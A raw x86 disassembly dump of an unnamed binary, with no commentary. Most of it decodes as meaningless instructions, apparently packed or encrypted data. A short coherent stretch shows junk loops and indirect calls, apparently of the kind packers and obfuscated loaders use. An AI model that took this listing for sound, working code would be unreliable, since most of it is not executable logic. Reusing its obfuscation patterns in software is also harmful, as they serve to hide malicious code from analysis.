  40a8c7:	popf   
  40a8c8:	int    0xdc
  40a8ca:	xchg   esi,eax
  40a8cb:	test   eax,0x88810b2a
  40a8d0:	jg     0x40a915
  40a8d2:	fild   DWORD PTR [esi+0x16]
  40a8d5:	mov    eax,0xa666a222
  40a8da:	mov    dh,0xaa
  40a8dc:	pop    esi
  40a8dd:	xchg   edx,eax
  40a8de:	and    edx,DWORD PTR [edx-0x2a65ecd6]
  40a8e4:	inc    ecx
  40a8e5:	retf   0x891
  40a8e8:	pop    esp
  40a8e9:	adc    dl,ah
  40a8eb:	xchg   edi,eax
  40a8ec:	dec    ecx
  40a8ed:	or     DWORD PTR [edi],edx
  40a8ef:	cdq    
  40a8f0:	arpl   WORD PTR [ebx+ebx*4+0x4f2359f1],sp
  40a8f7:	mov    esp,0x1eb0c108
  40a8fc:	jg     0x40a890
  40a8fe:	cmp    eax,0x29d9cdf8
  40a903:	and    dl,BYTE PTR ds:0x85822d1d
  40a909:	xor    BYTE PTR [edi-0x4f91afd5],dl
  40a90f:	sar    BYTE PTR [ecx-0x31de48be],0x3d
  40a916:	out    0xbe,al
  40a918:	add    DWORD PTR [edi+ebx*8+0x2d],esp
  40a91c:	mov    esp,0x7326f333
  40a921:	leave  
  40a922:	test   eax,0xb2e83454
  40a927:	dec    esp
  40a928:	int3   
  40a929:	fwait
  40a92a:	daa    
  40a92b:	sbb    al,0x17
  40a92d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a92e:	adc    ebx,DWORD PTR [edx]
  40a930:	dec    ebp
  40a931:	and    eax,0xb642a742
  40a936:	ja     0x40a8df
  40a938:	hlt    
  40a939:	adc    BYTE PTR [esi-0x4],bl
  40a93c:	sub    eax,0x3742f6fa
  40a941:	retf   
  40a942:	adc    bh,BYTE PTR [esi+0x21]
  40a945:	mov    ebp,DWORD PTR [ebx-0x20f7e222]
  40a94b:	dec    ecx
  40a94c:	xor    DWORD PTR ds:0x35cc91c6,ecx
  40a952:	inc    ebx
  40a953:	add    eax,0x69e89686
  40a958:	inc    ecx
  40a959:	dec    edi
  40a95a:	stc    
  40a95b:	push   ebx
  40a95c:	mov    bl,0x2e
  40a95e:	pop    ss
  40a95f:	sub    eax,0x632941a
  40a964:	pop    edi
  40a965:	xor    bh,BYTE PTR [ebp-0x615e0909]
  40a96b:	xchg   BYTE PTR [edx],bl
  40a96d:	push   ebx
  40a96e:	addr16 and ah,bl
  40a971:	fcomp  QWORD PTR [eax]
  40a973:	pop    ecx
  40a974:	cli    
  40a975:	and    bl,al
  40a977:	pop    ecx
  40a978:	sub    al,BYTE PTR [ebp+edx*8+0x2d2ff34e]
  40a97f:	mov    bh,0xac
  40a981:	clc    
  40a982:	mov    eax,0x3bf86046
  40a987:	pop    ecx
  40a988:	xor    eax,0xf0dca5f4
  40a98d:	in     al,0x7b
  40a98f:	xor    DWORD PTR [eax+0x52876501],ebx
  40a995:	gs jle 0x40a92d
  40a998:	daa    
  40a999:	les    esp,FWORD PTR ds:0x7c18fe8a
  40a99f:	cmp    ah,ah
  40a9a1:	adc    al,0x11
  40a9a3:	leave  
  40a9a4:	loop   0x40a9ce
  40a9a6:	mov    eax,ds:0xb48343ff
  40a9ab:	imul   edi
  40a9ad:	cmp    eax,0x246894e6
  40a9b2:	(bad)  [eax+ebx*2]
  40a9b5:	mov    ds:0x98fc767,eax
  40a9ba:	and    eax,0x190983e1
  40a9bf:	mov    esi,0x749583a7
  40a9c4:	inc    eax
  40a9c5:	bound  esi,QWORD PTR [edi]
  40a9c7:	adc    edi,DWORD PTR [edx+0x63c277ba]
  40a9cd:	dec    ebx
  40a9ce:	and    al,0x8f
  40a9d0:	bound  ebp,QWORD PTR [ecx*8+0x1045702b]
  40a9d7:	lock aaa 
  40a9d9:	ror    BYTE PTR [ecx+eiz*2],1
  40a9dc:	pop    edi
  40a9dd:	daa    
  40a9de:	test   DWORD PTR [ebx],0xb609c1c9
  40a9e4:	shr    DWORD PTR [edx+0x7e49379c],cl
  40a9ea:	pop    esp
  40a9eb:	lahf   
  40a9ec:	jae    0x40a9b6
  40a9ee:	or     al,0x81
  40a9f0:	add    ch,dh
  40a9f2:	test   ebx,esp
  40a9f4:	gs enter 0x1ff1,0x1
  40a9f9:	pop    ds
  40a9fa:	shl    DWORD PTR [ebp+edx*8+0x4dd1d54e],0xea
  40aa02:	mov    ch,0x9b
  40aa04:	adc    al,0xc8
  40aa06:	call   0xac128c93
  40aa0b:	(bad)
  40aa0e:	push   0xc4225494
  40aa13:	push   esi
  40aa14:	and    eax,0x40614e06
  40aa19:	ja     0x40a9cf
  40aa1b:	(bad)  
  40aa1c:	cmp    DWORD PTR [ecx],ebp
  40aa1e:	pop    ebx
  40aa1f:	(bad)  [eax-0x3cf3367]
  40aa25:	fst    QWORD PTR [ebx-0x22b1b799]
  40aa2b:	out    dx,al
  40aa2c:	xor    ebp,ebx
  40aa2e:	mov    ecx,0x85af9fad
  40aa33:	mov    ebp,0xc85bfa65
  40aa38:	ds mov dl,0x7f
  40aa3b:	arpl   WORD PTR [eax+0x13416315],dx
  40aa41:	neg    BYTE PTR [ebx+0xe]
  40aa44:	dec    esp
  40aa45:	xchg   DWORD PTR [ebp+0x7e4b9ea1],ebx
  40aa4b:	(bad)  
  40aa4c:	mov    al,0x7
  40aa4e:	je     0x40aa31
  40aa50:	ins    BYTE PTR es:[edi],dx
  40aa51:	sahf   
  40aa52:	xchg   DWORD PTR [eax],eax
  40aa54:	jne    0x40aa29
  40aa56:	mov    bl,bl
  40aa58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa59:	sub    ah,al
  40aa5b:	das    
  40aa5c:	lea    ebx,[ebp*1+0x20a5caa6]
  40aa63:	cmp    ecx,DWORD PTR [eax]
  40aa65:	adc    al,0x63
  40aa67:	popf   
  40aa68:	sub    cl,dh
  40aa6a:	sub    al,0x68
  40aa6c:	cwde   
  40aa6d:	inc    esi
  40aa6e:	cmp    al,0x32
  40aa70:	daa    
  40aa71:	xor    BYTE PTR [edx],ch
  40aa73:	fucomp st(5)
  40aa75:	mov    bl,bh
  40aa77:	ss add al,0xbd
  40aa7a:	jmp    DWORD PTR [edi*8-0x44874d1d]
  40aa81:	(bad)  
  40aa82:	jbe    0x40aa4e
  40aa84:	xchg   edi,eax
  40aa85:	ret    
  40aa86:	out    0xf8,eax
  40aa88:	jp     0x40aaee
  40aa8a:	push   es
  40aa8b:	push   ebp
  40aa8c:	popf   
  40aa8d:	xchg   BYTE PTR [ebx+esi*2-0x6108e55],al
  40aa94:	push   ds
  40aa95:	jmp    0xf1686c25
  40aa9a:	jae    0x40ab0f
  40aa9c:	imul   eax,DWORD PTR es:[eax-0x6b],0x39192890
  40aaa4:	nop
  40aaa5:	sub    ah,BYTE PTR [edx-0x33]
  40aaa8:	std    
  40aaa9:	or     BYTE PTR [ebx],cl
  40aaab:	jmp    0x31c4b48f
  40aab0:	adc    eax,0xd6368b45
  40aab5:	add    BYTE PTR [ebx-0x1f],ah
  40aab8:	jmp    0x40aa50
  40aaba:	mov    dh,0x11
  40aabc:	push   es
  40aabd:	retf   0x7f55
  40aac0:	cmc    
  40aac1:	cdq    
  40aac2:	inc    esp
  40aac3:	imul   ebp,DWORD PTR [ebp+edx*2+0x1a],0xffffffc1
  40aac8:	mov    ebp,ds
  40aaca:	pop    ebp
  40aacb:	popa   
  40aacc:	and    al,0x93
  40aace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aacf:	jmp    0x5ace9d67
  40aad4:	xor    al,0x3b
  40aad6:	add    al,0x51
  40aad8:	or     ebp,DWORD PTR [ecx]
  40aada:	push   ds
  40aadb:	lea    ecx,[ebx-0x44]
  40aade:	cmc    
  40aadf:	pop    es
  40aae0:	sbb    DWORD PTR [ecx+0x74],0x8c88bc49
  40aae7:	mov    eax,0x64adfdad
  40aaec:	jge    0x40ab0a
  40aaee:	cmp    DWORD PTR [esi+0x3097ee48],esp
  40aaf4:	repnz (bad) 
  40aaf6:	je     0x40aacc
  40aaf8:	push   ebx
  40aaf9:	popa   
  40aafa:	xchg   ebp,eax
  40aafb:	or     BYTE PTR [eax],ah
  40aafd:	aam    0x4d
  40aaff:	xchg   ebp,eax
  40ab00:	jo     0x40aae0
  40ab02:	mov    BYTE PTR [edi],bh
  40ab04:	inc    esi
  40ab05:	push   ebp
  40ab06:	mov    ch,BYTE PTR [edx]
  40ab08:	data16 jecxz 0x40aaf4
  40ab0b:	enter  0xc336,0x4b
  40ab0f:	clc    
  40ab10:	ds pop esp
  40ab12:	ins    BYTE PTR es:[edi],dx
  40ab13:	retf   0x886a
  40ab16:	fdivr  st(6),st
  40ab18:	sbb    eax,0x6ce5fe4a
  40ab1d:	xor    ch,BYTE PTR [eax+0xa502ab]
  40ab23:	shl    BYTE PTR [eax+0x6c],1
  40ab26:	sar    DWORD PTR [ecx],cl
  40ab28:	cld    
  40ab29:	add    ebx,DWORD PTR [ebx+eiz*1]
  40ab2c:	fcompp 
  40ab2e:	retf   0x9b3
  40ab31:	out    0xdf,eax
  40ab33:	xor    DWORD PTR [ecx-0x62],esp
  40ab36:	jp     0x40ab7f
  40ab38:	jl     0x40ab8b
  40ab3a:	pop    esp
  40ab3b:	mov    bh,0xc
  40ab3d:	sbb    al,0x3e
  40ab3f:	ss push cs
  40ab41:	data16 aaa 
  40ab43:	mov    ah,0x84
  40ab45:	xchg   esp,eax
  40ab46:	shl    BYTE PTR ds:0x496bd48b,cl
  40ab4c:	push   eax
  40ab4d:	and    edx,0x3b9afda8
  40ab53:	xchg   edi,eax
  40ab54:	int3   
  40ab55:	jge    0x40ab3a
  40ab57:	daa    
  40ab58:	sub    BYTE PTR [eax],ch
  40ab5a:	cli    
  40ab5b:	jmp    0xd877ad2a
  40ab60:	or     eax,0x2e295883
  40ab65:	cdq    
  40ab66:	out    dx,al
  40ab67:	inc    edi
  40ab68:	(bad)  [ecx+0x50d48d6c]
  40ab6e:	aaa    
  40ab6f:	js     0x40ab24
  40ab71:	jmp    0x2045:0x393f11f7
  40ab78:	xchg   dh,bl
  40ab7a:	lods   eax,DWORD PTR ds:[esi]
  40ab7b:	cmp    al,0xd
  40ab7d:	sbb    al,0xe6
  40ab7f:	jae    0x40ab88
  40ab81:	inc    edx
  40ab82:	lahf   
  40ab83:	and    ebx,DWORD PTR [ecx+0x21b353f5]
  40ab89:	imul   ecx,DWORD PTR [edi+edi*4-0x7c0ba646],0x22b26bb7
  40ab94:	add    BYTE PTR [ecx-0xe7622ed],ch
  40ab9a:	adc    BYTE PTR [edx],0x2b
  40ab9d:	scas   eax,DWORD PTR es:[edi]
  40ab9e:	ins    BYTE PTR es:[edi],dx
  40ab9f:	adc    DWORD PTR [edi],edi
  40aba1:	xchg   esi,eax
  40aba2:	imul   ebp,DWORD PTR [esi-0x1c271155],0x68
  40aba9:	fbstp  TBYTE PTR [ebx+edx*2+0x7f]
  40abad:	inc    edx
  40abae:	sbb    DWORD PTR [edi-0x25bff308],ecx
  40abb4:	addr16 mov ds:0x5903,eax
  40abb8:	push   edx
  40abb9:	pop    ebx
  40abba:	loopne 0x40ac04
  40abbc:	mov    fs,WORD PTR [ebx+edi*1]
  40abbf:	stos   DWORD PTR es:[edi],eax
  40abc0:	lods   al,BYTE PTR ds:[esi]
  40abc1:	pop    es
  40abc2:	xchg   edi,eax
  40abc3:	push   ds
  40abc4:	(bad)  
  40abc5:	fimul  WORD PTR [edx-0x5fabd9fd]
  40abcb:	ja     0x40ab68
  40abcd:	push   0xc06126a8
  40abd2:	pop    eax
  40abd3:	call   0xc4f54ea2
  40abd8:	adc    ebp,DWORD PTR [ebx]
  40abda:	mov    bl,BYTE PTR [eax+0x7d6562a7]
  40abe0:	scas   al,BYTE PTR es:[edi]
  40abe1:	call   0xa6b:0x484e9a7a
  40abe8:	and    eax,0xd7be93b
  40abed:	push   ecx
  40abee:	inc    esp
  40abef:	xchg   ecx,eax
  40abf0:	cmp    al,0xeb
  40abf2:	sbb    al,0x65
  40abf4:	imul   edx,DWORD PTR [ebx+0x22ee5eb1],0xffffffe9
  40abfb:	fidiv  DWORD PTR [esi-0xf]
  40abfe:	fnstcw WORD PTR [ebx+esi*1]
  40ac01:	rol    BYTE PTR [ecx+0x42fcf535],1
  40ac07:	add    BYTE PTR [edi],cl
  40ac09:	out    0x42,eax
  40ac0b:	add    BYTE PTR [ebx],al
  40ac0d:	rol    edi,1
  40ac0f:	add    eax,0x42e703
  40ac14:	fwait
  40ac15:	sbb    BYTE PTR [eax],al
  40ac17:	add    BYTE PTR [ebx],bh
  40ac19:	cli    
  40ac1a:	mov    DWORD PTR ds:0x42fcdd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fd7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fcf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e6f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e6f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e23d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e2f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e6f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e6f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e128,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e128
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e128,ebx
  40acad:	cmp    DWORD PTR ds:0x42e128,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e128,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e2f7
  40acd5:	cmp    DWORD PTR ds:0x42e128,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e128
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e128,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e134
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fce1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fce1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fce1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd01
  40ad3c:	call   DWORD PTR ds:0x42e54b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fce1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fce1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ad3d
  40adb4:	fsub   st(3),st
  40adb6:	mov    al,ds:0x7070fd03
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ae11
  40adc0:	or     DWORD PTR [eax+0x24],ecx
  40adc3:	push   esp
  40adc4:	pop    es
  40adc5:	hlt    
  40adc6:	outs   dx,DWORD PTR ds:[esi]
  40adc7:	jae    0x40ae10
  40adc9:	ror    BYTE PTR [ebp-0x77],1
  40adcc:	int3   
  40adcd:	push   esp
  40adce:	mov    cl,0x3a
  40add0:	call   0x714df0d
  40add5:	xchg   esp,eax
  40add6:	mov    bl,0x2a
  40add8:	mov    dh,0x11
  40adda:	jne    0x40ae4c
  40addc:	and    BYTE PTR [ebx+ebx*4],ch
  40addf:	push   cs
  40ade0:	mov    dl,0x3d
  40ade2:	sub    DWORD PTR [esi+0x42af60c1],esp
  40ade8:	clc    
  40ade9:	cmp    BYTE PTR [edx+0x27],dh
  40adec:	mov    ebp,0x9b86d6
  40adf1:	mov    ?,WORD PTR [edi]
  40adf3:	hlt    
  40adf4:	cmp    dh,cl
  40adf6:	dec    eax
  40adf7:	stc    
  40adf8:	mov    ebp,0x19e8593
  40adfd:	mov    ah,0x61
  40adff:	ret    0x1f2a
  40ae02:	push   0xffffffa9
  40ae04:	call   FWORD PTR [eax+0x360ac241]
  40ae0a:	inc    esi
  40ae0b:	xchg   ecx,eax
  40ae0c:	ds stc 
  40ae0e:	fdiv   DWORD PTR [ecx-0x2de7ffe0]
  40ae14:	pop    ebx
  40ae15:	fist   DWORD PTR [eax-0x4bd94398]
  40ae1b:	push   es
  40ae1c:	xor    BYTE PTR [esi],bh
  40ae1e:	ja     0x40ae96
  40ae20:	or     DWORD PTR [esp+ecx*1],eax
  40ae23:	data16 jne 0x40ae6d
  40ae26:	cmc    
  40ae27:	mov    al,ds:0x76eabd03
  40ae2c:	push   ss
  40ae2d:	fnsave [ebx-0x6c]
  40ae30:	push   ss
  40ae31:	add    DWORD PTR [esi],esi
  40ae33:	imul   ecx,DWORD PTR [edx],0x34
  40ae36:	or     BYTE PTR [ebx],al
  40ae38:	mov    edi,0x5d195889
  40ae3d:	outs   dx,BYTE PTR ds:[esi]
  40ae3e:	ins    DWORD PTR es:[edi],dx
  40ae3f:	xlat   BYTE PTR ds:[ebx]
  40ae40:	dec    ecx
  40ae41:	add    eax,0x827703be
  40ae46:	mov    bh,0xf0
  40ae48:	dec    ebp
  40ae49:	jmp    0x40ade7
  40ae4b:	call   0x2ee50ec6
  40ae50:	sub    eax,0x4320fadb
  40ae55:	stos   DWORD PTR es:[edi],eax
  40ae56:	xor    BYTE PTR [edx],ah
  40ae58:	leave  
  40ae59:	in     al,0x36
  40ae5b:	scas   eax,DWORD PTR es:[edi]
  40ae5c:	xchg   esi,eax
  40ae5d:	xor    eax,DWORD PTR [ebx-0x2e]
  40ae60:	and    BYTE PTR [edx+0x21f6b5e4],ah
  40ae66:	fimul  DWORD PTR [esp+edx*1+0x50]
  40ae6a:	in     al,dx
  40ae6b:	les    ecx,FWORD PTR [ecx]
  40ae6d:	sbb    dl,ch
  40ae6f:	sbb    al,0x26
  40ae71:	ins    BYTE PTR es:[edi],dx
  40ae72:	aas    
  40ae73:	(bad)  
  40ae74:	push   cs
  40ae75:	daa    
  40ae76:	or     eax,0xb5c96922
  40ae7b:	es xchg ebx,eax
  40ae7d:	ds pop ds
  40ae7f:	adc    DWORD PTR [edi],0x55deece5
  40ae85:	mov    ebx,DWORD PTR ds:0xb17ed0ed
  40ae8b:	mov    esi,0x3360aa64
  40ae90:	jg     0x40ae53
  40ae92:	jbe    0x40ae16
  40ae94:	push   eax
  40ae95:	stc    
  40ae96:	je     0x40aeaf
  40ae98:	lea    ebx,ds:0xe5ff8188
  40ae9e:	lds    esp,FWORD PTR [eax+0x5]
  40aea1:	inc    eax
  40aea2:	cli    
  40aea3:	and    edx,DWORD PTR [esi]
  40aea5:	dec    ebx
  40aea6:	push   edi
  40aea7:	sub    bl,ah
  40aea9:	xchg   esp,eax
  40aeaa:	pop    esp
  40aeab:	ror    DWORD PTR [esi+0x199ff0e9],1
  40aeb1:	mov    ds:0x56f3c2e,eax
  40aeb6:	out    dx,al
  40aeb7:	or     bl,BYTE PTR [eax+eiz*8-0x24]
  40aebb:	retf   
  40aebc:	jmp    0x907e042b
  40aec1:	sbb    ecx,DWORD PTR [esi+0x44]
  40aec4:	jb     0x40af21
  40aec6:	mov    eax,DWORD PTR ds:0xb7d6cc75
  40aecc:	(bad)  
  40aecd:	pop    ecx
  40aece:	pop    edx
  40aecf:	ss push esi
  40aed1:	push   eax
  40aed2:	xchg   ecx,eax
  40aed3:	jecxz  0x40aedf
  40aed5:	fst    DWORD PTR [ebx+0x4]
  40aed8:	mov    edx,0x74d39620
  40aedd:	pop    edx
  40aede:	mov    WORD PTR [edx+0x3e9d8b98],cs
  40aee4:	iret   
  40aee5:	pop    ebp
  40aee6:	mov    eax,0xafaf77e2
  40aeeb:	rol    DWORD PTR [edi+0x25b7014c],0xa
  40aef2:	ss and eax,0x93a0b0cf
  40aef8:	cld    
  40aef9:	xchg   BYTE PTR [ebx-0x73a1bf93],dl
  40aeff:	aas    
  40af00:	push   DWORD PTR [eax]
  40af02:	mov    WORD PTR [ebx],?
  40af04:	mov    ebp,0xb4d1640a
  40af09:	std    
  40af0a:	xchg   esp,eax
  40af0b:	sbb    esi,DWORD PTR [eax+0x40d9ead8]
  40af11:	mov    al,ds:0xe0410c03
  40af16:	outs   dx,DWORD PTR ds:[esi]
  40af17:	xchg   ecx,eax
  40af18:	push   esi
  40af19:	int    0x10
  40af1b:	jle    0x40af6e
  40af1d:	lods   eax,DWORD PTR ds:[esi]
  40af1e:	pop    ds
  40af1f:	cdq    
  40af20:	xor    eax,0xf1fffb39
  40af25:	lahf   
  40af26:	les    esi,FWORD PTR [edi+0x2d5c7530]
  40af2c:	(bad)  
  40af2d:	adc    al,0x46
  40af2f:	push   esp
  40af30:	imul   esi,DWORD PTR [esi+0x5cfc7bb4],0x7fd32e61
  40af3a:	addr16 or al,0x51
  40af3d:	mov    ebx,ss
  40af3f:	shl    cl,1
  40af41:	mov    ah,0x65
  40af43:	and    BYTE PTR [esi-0x95bc554],ch
  40af49:	inc    eax
  40af4a:	jne    0x40af09
  40af4c:	out    dx,eax
  40af4d:	xor    BYTE PTR [ecx],0x83
  40af50:	fs pusha 
  40af52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af53:	in     al,0x65
  40af55:	retf   
  40af56:	xchg   edx,eax
  40af57:	push   0x16
  40af59:	sbb    DWORD PTR [ebp+0xe034c22],esp
  40af5f:	mov    dh,0xd
  40af61:	xchg   DWORD PTR es:[esi+0x6b],ebp
  40af65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af66:	and    al,0xbf
  40af68:	ins    DWORD PTR es:[edi],dx
  40af69:	pop    es
  40af6a:	jge    0x40af4b
  40af6c:	xlat   BYTE PTR ds:[ebx]
  40af6d:	scas   eax,DWORD PTR es:[edi]
  40af6e:	out    dx,eax
  40af6f:	call   0xf499:0x12d6d6b3
  40af76:	push   ss
  40af77:	mov    bl,0xe5
  40af79:	push   ebx
  40af7a:	sti    
  40af7b:	mov    ebp,0xeebdb820
  40af80:	movq   mm0,QWORD PTR [ebx]
  40af83:	sbb    esp,DWORD PTR [eax]
  40af85:	cmc    
  40af86:	outs   dx,DWORD PTR ds:[esi]
  40af87:	mov    bl,0xd3
  40af89:	push   0x6fe5243
  40af8e:	xchg   esp,eax
  40af8f:	(bad)  
  40af90:	pushf  
  40af91:	jmp    0x7a5a3e82
  40af96:	xchg   esi,eax
  40af97:	jg     0x40afef
  40af99:	daa    
  40af9a:	fmul   QWORD PTR [ecx+eax*2-0x4e236c2a]
  40afa1:	scas   eax,DWORD PTR es:[edi]
  40afa2:	ja     0x40af50
  40afa4:	adc    edi,DWORD PTR [edx-0x54]
  40afa7:	pop    esi
  40afa8:	push   eax
  40afa9:	pop    ds
  40afaa:	cmp    eax,0xaec8c3a1
  40afaf:	mov    ds:0x75c9f140,eax
  40afb4:	pop    ds
  40afb5:	sbb    DWORD PTR [edx+0x56],ecx
  40afb8:	js     0x40af6b
  40afba:	cmp    al,0xe1
  40afbc:	adc    bl,BYTE PTR [edi]
  40afbe:	sub    bh,BYTE PTR [esp+ebp*8+0x2ac7a2f9]
  40afc5:	aas    
  40afc6:	mov    eax,ds:0x64c7d7fa
  40afcb:	xchg   bl,ch
  40afcd:	or     esi,edx
  40afcf:	mov    bl,0x4f
  40afd1:	pop    ebx
  40afd2:	add    esp,DWORD PTR [esi-0x58]
  40afd5:	aas    
  40afd6:	jbe    0x40af82
  40afd8:	push   es
  40afd9:	cld    
  40afda:	sub    BYTE PTR [ebx*4-0x2f321a4d],bl
  40afe1:	mov    ebx,0xd2e3f913
  40afe6:	mov    WORD PTR [esi],?
  40afe8:	xchg   DWORD PTR [edx-0x49],esp
  40afeb:	shl    DWORD PTR ds:0x8423d1f9,cl
  40aff1:	xor    eax,esp
  40aff3:	jmp    0x24f6a757
  40aff8:	push   esi
  40aff9:	pop    esi
  40affa:	ss jge 0x40aff9
  40affd:	jg     0x40afd7
  40afff:	sti    
  40b000:	cmp    BYTE PTR [ebp+edx*4+0x43],dl
  40b004:	add    BYTE PTR [edx+esi*4],dl
  40b007:	ins    BYTE PTR es:[edi],dx
  40b008:	push   ebp
  40b009:	loop   0x40afd3
  40b00b:	mov    al,0xc5
  40b00d:	add    al,0x17
  40b00f:	imul   eax,ebx,0x47
  40b012:	sub    eax,0x609c38e2
  40b017:	test   DWORD PTR [ebp+0x36],edx
  40b01a:	push   ebx
  40b01b:	ret    
  40b01c:	xor    eax,0xf5e30ae4
  40b021:	mov    dh,0x35
  40b023:	addr16 push cs
  40b025:	es loopne 0x40afb4
  40b028:	or     DWORD PTR [edi-0x6a06110c],0x25
  40b02f:	dec    ebp
  40b030:	cmc    
  40b031:	fsub   DWORD PTR [edx+0x2a71a243]
  40b037:	(bad)  
  40b038:	pop    esp
  40b039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b03a:	jnp    0x40b089
  40b03c:	cmp    al,BYTE PTR [ebx]
  40b03e:	out    dx,al
  40b03f:	sub    al,0x7c
  40b041:	jle    0x40b034
  40b043:	fmul   DWORD PTR [ebp+0xecf78f1]
  40b049:	pop    edi
  40b04a:	or     BYTE PTR [esi],dl
  40b04c:	repz push 0x47
  40b04f:	pop    es
  40b050:	push   ss
  40b051:	xor    ebp,DWORD PTR [ecx+0x46]
  40b054:	or     cl,BYTE PTR [edx]
  40b056:	mov    cl,0xbb
  40b058:	or     BYTE PTR [eax+0x749eb03e],dl
  40b05e:	pop    esi
  40b05f:	(bad)  
  40b060:	mov    al,0x92
  40b062:	mov    es,WORD PTR [ebx+ebp*4-0x13]
  40b066:	push   edx
  40b067:	add    DWORD PTR [ecx-0x3619ee9],eax
  40b06d:	arpl   bx,dx
  40b06f:	cwde   
  40b070:	mov    ecx,0x3307ea04
  40b075:	retf   0xd930
  40b078:	push   0x69
  40b07a:	shr    DWORD PTR [edi+0x35a0dac1],0xff
  40b081:	jb     0x40b06d
  40b083:	das    
  40b084:	pop    ebp
  40b085:	push   0xffffffd2
  40b087:	push   edi
  40b088:	cmc    
  40b089:	scas   eax,DWORD PTR es:[edi]
  40b08a:	xchg   DWORD PTR [edi-0x474cecba],ecx
  40b090:	jae    0x40b05d
  40b092:	jge    0x40b04d
  40b094:	pop    edi
  40b095:	inc    ecx
  40b096:	xor    eax,0x15245945
  40b09b:	add    DWORD PTR [esi+ebp*4-0x9abbcd9],esp
  40b0a2:	or     DWORD PTR [eax],0x1a
  40b0a5:	leave  
  40b0a6:	dec    ecx
  40b0a7:	inc    esp
  40b0a8:	fcmove st,st(1)
  40b0aa:	xchg   esp,eax
  40b0ab:	xchg   esp,eax
  40b0ac:	in     eax,dx
  40b0ad:	push   edx
  40b0ae:	ins    WORD PTR es:[edi],dx
  40b0b0:	rcl    al,cl
  40b0b2:	popf   
  40b0b3:	rol    BYTE PTR [ebx],0xcc
  40b0b6:	add    al,0x19
  40b0b8:	fnstcw WORD PTR [ecx+0x2f]
  40b0bb:	jb     0x40b053
  40b0bd:	sub    eax,0x33ada894
  40b0c2:	xchg   BYTE PTR ds:0x6507deef,dl
  40b0c8:	mov    dl,0xe7
  40b0ca:	and    ebx,DWORD PTR [esi+0x7b]
  40b0cd:	xor    dh,BYTE PTR [esi]
  40b0cf:	jns    0x40b0fe
  40b0d1:	bound  ebx,QWORD PTR [esi]
  40b0d3:	push   edi
  40b0d4:	aad    0xa4
  40b0d6:	jmp    0xfca5d4e4
  40b0db:	ds (bad) 
  40b0dd:	fs das 
  40b0df:	inc    edi
